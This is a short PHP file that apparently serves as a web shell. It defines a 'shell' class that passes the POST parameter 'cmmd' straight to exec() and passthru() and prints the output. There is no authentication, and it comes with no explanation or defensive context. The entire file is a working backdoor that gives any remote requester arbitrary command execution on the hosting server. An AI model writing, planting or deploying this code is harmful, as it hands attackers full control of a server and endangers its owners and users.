<?php
class shell{
	function execute()
	{
		echo "<hr>";
		echo "<pre>";
		$result = exec($_POST['cmmd']);
		echo "</pre>";
		echo "<hr>";
	}
	
	function exesys()
	{
		echo "<hr>";
		echo "<pre>";
		$result = passthru($_POST['cmmd']);
		echo "</pre>";
		echo "<hr>";
	}
}

$sh = new shell();
$sh->exesys();

if ($_POST['action'] == 'execute')
	$sh->execute();
elseif ($_POST['action'] == 'exesys')
	$sh->exesys();
die("");
?>